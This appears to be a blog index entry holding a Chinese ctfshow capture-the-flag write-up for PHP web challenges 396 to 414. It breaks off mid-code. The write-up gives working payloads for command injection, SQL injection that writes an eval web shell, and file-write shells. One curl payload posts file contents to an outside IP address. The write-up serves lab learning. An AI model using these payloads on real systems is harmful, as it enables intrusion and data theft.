<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow-web入门-其他（1）</title>
      <link href="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/"/>
      <url>/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/</url>
      
        <content type="html"><![CDATA[<h1 id="18-其他"><a href="#18-其他" class="headerlink" title="18.其他"></a>18.其他</h1><p>靶场&#x2F;来源: ctfshow</p><h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><p>题目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>shell_exec</code>任意代码执行可以通过<code>;,||,&amp;&amp;</code>同时执行多个语句，配合<code>parse_url</code>绕过</p><p>payload:<code>?url=http://1/1;echo </code>cat *<code> &gt; a.txt;</code></p><p>这里可以选择从host下手还是path</p><h1 id="web397-400（parse-url路径rce）"><a href="#web397-400（parse-url路径rce）" class="headerlink" title="web397-400（parse_url路径rce）"></a>web397-400（parse_url路径rce）</h1><p>题目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>?url=http://127/echo </code>cat *<code> &gt; a.txt</code></p><h1 id="web401-402（parse-url协议绕过rce）"><a href="#web401-402（parse-url协议绕过rce）" class="headerlink" title="web401-402（parse_url协议绕过rce）"></a>web401-402（parse_url协议绕过rce）</h1><p>题目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    var_dump(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        die(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=xxx://<span class="number">127</span>/<span class="built_in">echo</span> `cat *` &gt; a.txt</span><br></pre></td></tr></table></figure><h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><p>题目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123; <span class="comment">#表示匹配ipv4地址</span></span><br><span class="line">        shell_exec(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">^xx表示以xx开头</span></span><br><span class="line"><span class="string">2[0-4]\d 表示200-249</span></span><br><span class="line"><span class="string">|表示或</span></span><br><span class="line"><span class="string">25[0-5] 表示250-255</span></span><br><span class="line"><span class="string">[01]?\d\d 表示000-199</span></span><br><span class="line"><span class="string">\. 表示小数点.</span></span><br><span class="line"><span class="string">&#123;3&#125;() 表示括号前面内容出现三次</span></span><br><span class="line"><span class="string">$表示结尾</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/;<span class="built_in">echo</span> `ls` &gt; a.txt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a><strong>web405</strong></h1><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = parse_url($_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, $url[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, $url[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, $url[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                shell_exec(<span class="string">&#x27;curl &#x27;</span>.$url[<span class="string">&#x27;scheme&#x27;</span>].$url[<span class="string">&#x27;host&#x27;</span>].$url[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析：</p><p><code>host</code>只能为ip地址</p><p><code>path</code>只能包含字母和数字</p><p><code>scheme</code>协议必须包含<code>~</code>，<code>.</code>，<code>php</code></p><p>所以我们可以从<code>scheme</code>下手</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?url=php://;curl -X POST -d <span class="string">&quot;q=`cat *`&quot;</span> <span class="number">106.55</span><span class="number">.188</span><span class="number">.110</span>;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/f</span><br><span class="line"></span><br><span class="line">-X 指定请求方式</span><br><span class="line">-q 指定参数</span><br><span class="line">`` 里面的内容会先被执行再发送</span><br></pre></td></tr></table></figure><h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a><strong>web406</strong></h1><p>题目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">require <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">//flag <span class="keyword">in</span> db</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;&#123;<span class="variable">$url</span>&#125;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filter_var ($url,FILTER_VALIDATE_URL)</code>验证<code>$url</code>是不是一个合法的url（至少包括协议和路径）</p><p><code>FILTER_SANITIZE_URL</code>：删除所有字符，除了字母、数字以及 <code>$-_.+!*&#39;(),&#123;&#125;|\^~[]&lt;&gt;#%”;/?😡&amp;=</code>（可以看到这里没有&lt;&gt;，所以下面需要进行十六进制编码）</p><p>使用</p><p>payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">0</span>://www.baidu.com;<span class="string">&#x27;union/**/select/**/1,0x3c3f706870206576616c28245f504f53545b615d293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/5.php&quot;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3c3f706870206576616c28245f504f53545b615d293b3f3e 十六进制编码绕过：&lt;?php eval($_POST[a]);?&gt;</span></span><br></pre></td></tr></table></figure><p>成功写入shell，使用蚁剑进行连接</p><p>可以看到题目提示<code>flag in db</code>，flag在数据库当中，而蚁剑连接到的账号只是<code>www-data</code>权限，不能连接mysql</p><p><img src="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>所以这里有三种思路</p><p>1.对Linux用户进行提权</p><p>2.使用php的mysql语句查询</p><p>3.写一个有sql注入的功能点代码，然后使用sqlmap跑</p><p>直接在idnex.php进行修改</p><p><img src="/Untitled-%201.png" class="lazyload placeholder" data-srcset="/Untitled-%201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>得到flag</p><p><img src="/Untitled-%202.png" class="lazyload placeholder" data-srcset="/Untitled-%202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var </span>(<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> static function add</span>()&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="title function_ invoke__"> file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>call_user_func()函数接受多个参数，并将第一个参数作为方法或函数名，后面作为参数进行调用</p><ul><li><p><code>call_user_func($callback [, $parameter1 [, $parameter2 [, ... ]]])</code></p></li><li><p><code>call_user_func</code>的一些用法，分为普通函数，类方法，静态方法和匿名函数</p><p>  <strong>示例 1：调用普通函数</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;greet&#x27;</span>, <span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure><p>  输出为：Hello, John!</p><p>  <strong>示例 2：调用类方法</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>([<span class="variable">$obj</span>, <span class="string">&#x27;sayHello&#x27;</span>], <span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  输出为：Hello, John!</p><p>  <strong>示例 3：调用静态方法</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$num</span> * <span class="variable">$num</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>([<span class="string">&#x27;Math&#x27;</span>, <span class="string">&#x27;square&#x27;</span>], <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出 25</span></span><br></pre></td></tr></table></figure><p>  <strong>示例 4：调用匿名函数（闭包）</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$greet</span>, <span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>filter_var</code> 指定一个过滤器过滤一个变量</p></li></ul><p>而<code>filter_var ($ip,FILTER_VALIDATE_IP)</code>，判断一个变量是不是ip</p><p>可以使用<code>ip的零压缩法</code>进行绕过，</p><blockquote><p>ip的零压缩法：</p><p>IPv6地址是一个128位长的二进制数，通常以8组16进制数的形式表示，每组表示16位（4个十六进制数字）。例如，一个IPv6地址可能如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:0000:0000:0000:0000:1428:57ab</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在零压缩法中，连续的全零段可以被简化表示为双冒号 <code>::</code>，但是 <code>::</code> 只能出现一次。这样可以大幅减少地址的长度。</p><p>下面是一个使用零压缩法表示的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8::1428:57ab</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述示例中，连续的零段 <code>0000:0000:0000:0000</code> 被替换为 <code>::</code>，使得地址更加简洁。</p></blockquote><p>而在php中<code>cafe::add</code> 表示调用名为 <code>add</code> 的静态方法，该方法属于 <code>cafe</code> 类</p><p>因为这两者的差异，形成了这一个绕过方法</p><p>payload：<code>?ip=cafe::add</code></p><h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式为：<code>写入内容@写入文件名</code></p><p>注意几个点：</p><ol><li>写入内容部分要用双引号包起来</li><li>写入内容不能含有空格</li></ol><p>payload:<code>?email=&quot;&lt;?=system($_GET[1]);?&gt;&quot;@1.php</code></p><h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123; <span class="comment">#检测是否符合邮箱格式 xxx@xxx</span></span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>); <span class="comment">#把flag和前面一个字符替换为空（去除）</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>); <span class="comment">#执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为@后面的内容不符合PHP语法，所以通过闭合去除掉</p><p>可行但是发现前面的”也是非法的<br>题目有个替换为.flag也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p><p>最终paylaod：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">然后post数据</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123; <span class="comment">#验证是否为布尔值，但不只是true和false，1和0</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;  <span class="comment">#如果$b为true或1都不行（1&gt;0）</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>所以我们可以使用其他值进行绕过：</p><p><code>?b=on</code>或<code>?b=yes</code></p><h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var </span>(<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123; <span class="comment">#注意到on和ON，大小写有区别，是不是一个大写一个小写也可以绕过呢，而且这里没过滤yes</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>?b=On</code>或<code>?b=yes</code></p><h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND); <span class="comment">#FILE_APPEND为追加模式，追加在文件内容末尾</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题很坑，如果单纯用命令执行ls之类的话，一个容器只能用一次，因为<code>//</code>会把后面添加进去的内容注释掉，下次添加内容就在注释里面，调用不了</p><p>payload：POST：<code>ctfshow=?&gt;&lt;?php system(&quot;cat *&quot;);?&gt;&lt;?</code></p><p>PS:这里也可以直接写个马进去</p><h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先POST请求发送</p><p><code>ctfshow=*/system($_GET[1]);/*</code></p><p>再</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：<span class="number">1</span>=cat flag.php|grep flag</span><br><span class="line">POST：ctfshow=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span 